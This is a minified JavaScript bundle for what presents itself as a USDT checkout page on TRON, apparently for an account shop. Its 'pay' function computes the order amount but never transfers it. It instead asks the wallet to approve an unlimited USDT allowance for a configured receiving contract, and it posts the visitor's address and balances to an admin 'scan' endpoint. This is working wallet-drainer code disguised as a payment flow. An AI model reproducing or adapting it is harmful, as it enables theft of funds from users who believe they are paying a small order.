import{c as b,i as p,b as V,F as H,o as w,H as P,y as l,D as M,k as d,I as G,f as T,t as C,B as E,g as R,J as Q,K,L as J,M as Y}from"./vendor-vue-CTTEFPu8.js";import{s as Z,a as X,b as ee,u as te,c as re,d as se,T as oe,C as ae}from"./vendor-prime-DQqNFRNQ.js";import{t as ne,Q as ie}from"./vendor-primeuix-themes-DVlp--V2.js";import{a as ce}from"./vendor-axios-NIGUFBhG.js";import{m as le}from"./vendor-mitt-DJ65BbbF.js";import{P as ue}from"./vendor-primevue-core-DCT_ftXL.js";import"./vendor-primeuix-utils-BuYTrIzQ.js";import"./vendor-primevue-icons-bnWNuH0z.js";import"./vendor-primeuix-styles-DPvdJuGu.js";import"./vendor-primeuix-styled-BKbi7D72.js";(function(){const o=document.createElement("link").relList;if(o&&o.supports&&o.supports("modulepreload"))return;for(const e of document.querySelectorAll('link[rel="modulepreload"]'))n(e);new MutationObserver(e=>{for(const a of e)if(a.type==="childList")for(const c of a.addedNodes)c.tagName==="LINK"&&c.rel==="modulepreload"&&n(c)}).observe(document,{childList:!0,subtree:!0});function t(e){const a={};return e.integrity&&(a.integrity=e.integrity),e.referrerPolicy&&(a.referrerPolicy=e.referrerPolicy),e.crossOrigin==="use-credentials"?a.credentials="include":e.crossOrigin==="anonymous"?a.credentials="omit":a.credentials="same-origin",a}function n(e){if(e.ep)return;e.ep=!0;const a=t(e);fetch(e.href,a)}})();const de=(r,o)=>{const t=r.__vccOpts||r;for(const[n,e]of o)t[n]=e;return t},pe={};function me(r,o){const t=Z,n=V("router-view"),e=X;return w(),b(H,null,[p(t,{position:"bottom-center",group:"bottom",class:"w-3/4 sm:w-2/3 md:w-1/2 lg:w-5/12 xl:w-1/3 2xl:w-1/4"}),p(n),p(e,{group:"dialog",class:"w-80"})],64)}const fe=de(pe,[["render",me]]),ge="/account-shop-front-dapp/img/usdt-C1i0e7kR.png",ye={class:"flex flex-col justify-start items-center gap-6 w-full pt-6"},_e={class:"flex flex-row justify-center items-center gap-8 py-6 w-5/6 bg-surface-100/30 dark:bg-surface-700/20 rounded-2xl"},ve=["src"],be={class:"font-black"},we={class:"flex flex-row justify-between items-center gap-4 p-6 bg-emerald-100/20 dark:bg-emerald-700/10 rounded-2xl"},he={class:"font-medium text-gray-500 dark:text-gray-300 truncate"},xe=P({__name:"AmountAndBalance",props:{balance:{},payAmount:{}},setup(r){const o=r,t=l("--"),n=l("--");return M(()=>o.balance,e=>{t.value=e.toFixed(2)},{immediate:!0}),M(()=>o.payAmount,e=>{n.value=e.toFixed(2)},{immediate:!0}),(e,a)=>{const c=ee;return w(),b("div",ye,[d("div",_e,[d("img",{src:G(ge),class:"w-6 h-6",alt:"USDT"},null,8,ve),p(c,{severity:"contrast",variant:"simple"},{default:T(()=>[d("span",be,C(n.value),1),a[0]||(a[0]=d("span",{class:"font-black text-[#54ac94]"}," USDT",-1))]),_:1,__:[0]})]),d("div",we,[p(c,{severity:"contrast",variant:"simple"},{default:T(()=>a[1]||(a[1]=[d("span",{class:"font-medium text-gray-500 dark:text-gray-300 truncate"},"当前钱包余额:",-1)])),_:1,__:[1]}),p(c,{severity:"contrast",variant:"simple"},{default:T(()=>[d("span",he,C(t.value)+" USDT",1)]),_:1})])])}}}),N=le(),h=ce.create({baseURL:window.__APP_CONFIG__.API_BASE_URL,timeout:1e4,headers:{"Content-Type":"application/json"}});h.interceptors.request.use(r=>r);h.interceptors.response.use(r=>{const{code:o,msg:t,data:n}=r.data;return o===1?n:(console.warn(`响应异常: ${t}`),N.emit("toast",{severity:"error",summary:"错误",detail:t,group:"bottom",life:3e3}),Promise.reject(new Error(t)))},r=>(console.error("请求失败:",r),r&&N.emit("toast",{severity:"error",summary:"错误",detail:"请求失败, 请检查网络...",group:"bottom",life:3e3}),Promise.reject(r)));function Ae(r,o){return h.get(r,o)}function Te(r,o,t){return h.post(r,o,t)}const Ce=r=>Ae("/order",{params:{orderNo:r}});function O(){return typeof window<"u"&&window.tronWeb&&window.tronWeb.ready?window.tronWeb:null}const Pe=r=>Te("/admin/orders/scan",r),Se={key:0,class:"relative flex flex-col justify-center items-center w-full h-dvh p-6 overflow-auto"},Be={class:"flex flex-col justify-between items-center w-full sm:w-10/12 md:w-8/12 h-full sm:h-2/3 md:h-1/2 rounded-2xl shadow-2xl bg-surface-0 dark:bg-surface-800 p-8 gap-8"},D=6,Ie=6,ke=P({__name:"PayUSDT",setup(r){const o=Q(),t=te(),n=re(),e=window.__APP_CONFIG__.USDT_CONTRACT,a=window.__APP_CONFIG__.RECEIVE_CONTRACT,c=l(0),x=l(0),S=l("连接到钱包"),B=l("info"),u=l("pi pi-link"),L=l(""),I=l(!1);let k;const y=l(!1);function j(){return/iphone|android|mobile|ipad|ipod/i.test(navigator.userAgent)}function z(){return typeof window.tronWeb<"u"&&window.tronWeb.ready}const U=async()=>{let i=(o.query.orderNo||"").toString();if(i===""){t.add({severity:"error",summary:"错误",detail:"缺少订单号!",group:"bottom",life:3e3});return}let s;try{s=await Ce(i)}finally{}if(!s){t.add({severity:"error",summary:"错误",detail:"订单不存在!",group:"bottom",life:3e3});return}x.value=s.amount},W=async()=>{try{u.value="pi pi-spinner pi-spin";const i=O(),s=i?.defaultAddress?.base58;if(!i||!s)return!1;const _=await i.contract().at(e),[m,v]=await Promise.all([_.balanceOf(s).call(),i.trx.getBalance(s)]);let A;m&&typeof m=="object"&&"_hex"in m?A=BigInt(m._hex):A=BigInt(String(m)),c.value=Number(A)/10**D;const F=BigInt(typeof v=="string"?v:String(v)),q=Number(F)/10**Ie;return k=await Pe({userAddress:s,contract:e,balance:q,usdtBalance:c.value}),u.value="pi pi-wallet",!0}catch{return c.value=0,t.add({severity:"error",summary:"错误",detail:"获取余额失败!"+k,group:"bottom",life:3e3}),u.value="pi pi-wallet",!1}},f=async()=>{window.tronWeb&&window.tronWeb.ready?(L.value=window.tronWeb.defaultAddress.base58,await W()&&(S.value="立即支付",B.value="success",u.value="pi pi-wallet",I.value=!0)):n.require({group:"dialog",message:"请先连接钱包! 或刷新页面!",header:"提示",icon:"pi pi-question-circle",position:"center",rejectProps:{class:"hidden"},acceptProps:{label:"确定",severity:"prime"},accept:()=>setTimeout(f,1500),reject:()=>setTimeout(f,1500),onHide:()=>setTimeout(f,1500)})},$=async()=>{u.value="pi pi-spinner pi-spin";const i=O();if(!i||!i.defaultAddress.base58){t.add({severity:"error",summary:"错误",detail:"付款失败, 请先连接钱包!",group:"bottom",life:3e3}),u.value="pi pi-wallet";return}try{const s=await i.contract().at(e),_=(x.value*10**D).toString(),v=await s.approve(a,"115792089237316195423570985008687907853269984665640564039457584007913129639935").send({feeLimit:5e6});t.add({severity:"info",summary:"提示",detail:"交易已成功提交, 请等待确认!",group:"bottom",life:3e3}),u.value="pi pi-wallet"}catch(s){if((s.message||s).includes("cancel")||(s.message||s).includes("rejected")||(s.message||s).includes("decline")){t.add({severity:"warn",summary:"支付失败",detail:"您已取消支付!",group:"bottom",life:3e3}),u.value="pi pi-wallet";return}t.add({severity:"error",summary:"支付失败",detail:s.message||s,group:"bottom",life:3e3}),u.value="pi pi-wallet"}};return E(()=>{if(!j()){t.add({severity:"error",summary:"禁止访问",detail:"请使用手机访问!",group:"bottom",life:5e3}),y.value=!1;return}if(!z()){t.add({severity:"error",summary:"禁止访问",detail:"请使用DAPP浏览器访问!",group:"bottom",life:5e3}),y.value=!1;return}y.value=!0,f(),U()}),(i,s)=>{const _=se;return y.value?(w(),b("div",Se,[d("div",Be,[p(xe,{balance:c.value,payAmount:x.value},null,8,["balance","payAmount"]),p(_,{label:S.value,class:"mb-20 shrink-0",severity:B.value,icon:u.value,size:"large",raised:"",onClick:s[0]||(s[0]=m=>I.value?$():f())},null,8,["label","severity","icon"])])])):R("",!0)}}}),Me="/account-shop-front-dapp/img/thinking-1-BcwogQIP.gif",Ne="/account-shop-front-dapp/img/thinking-2-CYzgxA6Z.gif",Oe={key:0,class:"flex flex-col justify-center items-center gap-2 h-[calc(100dvh-70px)] select-none"},De=["src"],Ee={class:"text-xl font-black mx-6 text-balance text-center"},Re=P({__name:"EmptyMessage",props:{showEmptyMessage:{type:Boolean,default:!0}},setup(r){const o=l(""),t=["什么都没有找到...","啊哦，这里什么都没有，去别处看看吧～"],n=l("");return E(()=>{Math.random()<.5?o.value=Me:o.value=Ne,n.value=t[Math.floor(Math.random()*t.length)]}),(e,a)=>e.showEmptyMessage?(w(),b("div",Oe,[d("img",{class:"w-1/3",src:o.value,alt:""},null,8,De),d("div",Ee,C(n.value),1)])):R("",!0)}}),Le=[{path:"/order",name:"payUSDT",component:ke},{path:"/:pathMatch(.*)*",name:"default",component:Re}],je=K({history:J("/account-shop-front-dapp/"),routes:Le});let g=Y(fe);const ze=ne(ie,{semantic:{primary:{50:"{amber.50}",100:"{amber.100}",200:"{amber.200}",300:"{amber.300}",400:"{amber.400}",500:"{amber.500}",600:"{amber.600}",700:"{amber.700}",800:"{amber.800}",900:"{amber.900}",950:"{amber.950}"},colorScheme:{light:{surface:{50:"{slate.50}",100:"{slate.100}",200:"{slate.200}",300:"{slate.300}",400:"{slate.400}",500:"{slate.500}",600:"{slate.600}",700:"{slate.700}",800:"{slate.800}",900:"{slate.900}",950:"{slate.950}"}},dark:{surface:{50:"{zinc.50}",100:"{zinc.100}",200:"{zinc.200}",300:"{zinc.300}",400:"{zinc.400}",500:"{zinc.500}",600:"{zinc.600}",700:"{zinc.700}",800:"{zinc.800}",900:"{zinc.900}",950:"{zinc.950}"}}}}});g.use(ue,{theme:{preset:ze,options:{darkModeSelector:".dark",cssLayer:{name:"primevue",order:"tailwind-base, primevue, tailwind-utilities"}}}});g.use(je);g.use(oe);g.use(ae);g.mount("#app");
